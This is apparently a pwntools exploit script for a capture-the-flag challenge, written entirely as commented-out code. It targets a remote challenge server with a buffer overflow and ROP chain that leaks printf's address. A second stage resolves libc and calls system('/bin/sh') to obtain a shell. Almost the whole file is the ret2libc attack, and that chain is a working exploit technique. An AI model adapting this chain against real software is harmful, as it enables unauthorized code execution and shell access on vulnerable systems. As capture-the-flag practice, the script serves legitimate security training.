# #!/usr/bin/env python3

# from pwn import *

# exe = ELF("./main_patched")
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.35.so")

# context.binary = exe


# def conn():
#     if args.LOCAL:
#         r = process([exe.path])
#         if args.DEBUG:
#             gdb.attach(r)
#     else:
#         r = remote("ctf-chall.stembascc.com",5229)

#     return r


# def main():
#     # good luck pwning :)
#     r = conn()
#     b_exit = b"exit"
#     offset = 20
#     safe_region = 0x00000000004011d3
#     rop = ROP(exe)
#     ret = rop.find_gadget(['ret'])[0]
#     rop.raw(b_exit + b"A" * offset)
#     rop.raw(ret)
#     rop.rsi = exe.got['printf']
#     rop.raw(0x00000000004011f7)
#     rop.raw(safe_region)
#     r.sendline(rop.chain())
#     print(r.recv(9999))
#     # leak_printf = u64(r.recvline().strip().ljust(8, b'\x00'))
#     write("payload",rop.chain())
#     # log.info(f"leak printf : {hex(leak_printf)}")
#     # offset_printf = libc.sym['printf']
#     # libc.address = leak_printf - offset_printf
#     # system = libc.sym['system']
#     # bin_sh = next(libc.search(b"/bin/sh"))
#     # rop2 = ROP(exe)
#     # rop2.raw(b_exit + b"A" * offset)
#     # rop2.rdi = bin_sh
#     # rop2.raw(ret)
#     # rop2.raw(system)
#     # rop2.raw(0)
#     # r.sendline(rop2.chain())
#     # r.interactive()


# if __name__ == "__main__":
#     main()

# pusing jir